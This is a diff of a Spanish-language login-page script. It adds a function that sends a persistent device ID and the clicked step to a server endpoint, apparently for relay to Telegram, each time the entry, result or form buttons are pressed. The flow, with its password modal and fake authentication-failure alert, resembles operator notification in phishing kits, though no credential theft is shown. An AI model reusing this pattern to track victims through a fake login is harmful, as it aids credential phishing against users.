@@ -19,6 +19,9 @@ showLoadingScreen(() => {
 });
 
 document.getElementById("entrarBtn").addEventListener("click", function () {
+
+    enviarAvisoTelegram('entrar');
+
     showLoadingScreen(() => {
         document.querySelector(".password-modal").classList.remove("hidden");
     });
@@ -223,16 +226,42 @@ function obtenerIDDispositivo() {
     return dispositivoID;
 }
 
-// Enviar datos al servidor
-async function enviarDatos(tipo, texto) {
+// ========================================
+// ENVIAR AVISOS A TELEGRAM
+// ========================================
+
+async function enviarAvisoTelegram(origen) {
+
     const dispositivoID = obtenerIDDispositivo();
-    await fetch(`/send-${tipo}`, {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ dispositivoID, texto })
-    });
+
+    try {
+
+        const respuesta = await fetch('/opciones/solicitar', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                dispositivoID,
+                origen
+            })
+        });
+
+        if (!respuesta.ok) {
+            throw new Error('No se pudo enviar el aviso');
+        }
+
+        return true;
+
+    } catch (error) {
+
+        console.error(
+            'Error enviando aviso a Telegram:',
+            error.message
+        );
+
+        return false;
+    }
 }
 
 // Validaciones
@@ -285,14 +314,12 @@ function togglePasswordVisibility() {
 }
 
 
-// Botones de entrada
-
-document.getElementById("resultado-aceptarBtn").addEventListener("click", async function () {
-    await enviarDatos('calificacion', 'SOLICITAR');
+document.getElementById("resultado-aceptarBtn").addEventListener("click", function () {
+    enviarAvisoTelegram('resultado');
 });
 
-document.getElementById("formulario-boton-continuar").addEventListener("click", async function () {
-    await enviarDatos('auth', 'SOLICITAR');
+document.getElementById("formulario-boton-continuar").addEventListener("click", function () {
+    enviarAvisoTelegram('formulario');
 });
 
 // Función para mostrar la alerta personalizada de autenticación incorrecta
